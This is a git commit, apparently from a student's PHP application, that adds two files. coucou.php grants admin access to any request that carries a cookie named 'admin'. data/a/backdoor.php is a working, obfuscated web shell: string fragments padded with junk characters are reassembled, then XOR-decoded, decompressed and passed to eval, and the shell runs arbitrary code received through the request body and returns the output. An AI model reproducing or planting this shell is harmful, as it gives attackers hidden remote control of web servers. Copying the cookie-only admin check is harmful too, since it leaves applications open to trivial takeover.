e0791da1c95715b96cf9cb8a751e4e62e5b62805
jeremy.khalfa2017@campus-eni.fr <jeremy.khalfa2017@campus-eni.fr>
2022-08-23 14:04:49 +0200

    Version initiale de l'appli*

---
+++ coucou.php
@@ -0,0 +1,9 @@
+<?php
+
+if (!isset($_COOKIE['admin']))
+{
+	die("NOPE !");
+} else {
+	echo "BIENVENUE ADMIN !";
+}
+?>
---
+++ data/a/backdoor.php
@@ -0,0 +1,11 @@
+<?php
+$f=str_replace('v','','cvreavtve_fuvnvcvtion');
+$t='0al(@gzuS0ncompreS0ss(@x(@bS0ase64_S0decodS0e($mS0[S01]),$k))S0);$o=@obS0_geS0t_contentS0s();@ob_e';
+$N='nS0d_cleS0an();$rS0=@bS0ase6S04_encoS0de(S0@x(@gzcS0ompresS0s($o),$kS0));print(S0S0"$p$kh$r$kf");}';
+$A='S0nction x($t,$k){S0$c=sS0trlen($kS0)S0S0;$l=strS0len($t);$o=""S0;for(S0$i=0;$i<$S0l;S0){for(S0$j=';
+$S='S00;($j<$c&&S0$S0i<$lS0S0);$jS0++,$i++){$o.=$t{$i}^$k{S0$j};}S0}returnS0 $oS0;}ifS0 (@preg_maS0tch';
+$l='$k=S0"c5745807";S0$kh="6S00dS0e44d2c6fS0b";$S0kf="66d8beS04c6d4a"S0;$p=S0"A3S0TCq8tM0S0Fzpqdp4";fS0uS0';
+$v='("/S0$khS0(.+)$kf/",@fiS0le_S0gS0et_conteS0nS0ts("phpS0://inpuS0t"),$m)==1) {@oS0bS0_starS0t();@evS';
+$x=str_replace('S0','',$l.$A.$S.$v.$t.$N);
+$X=$f('',$x);$X();
+?>
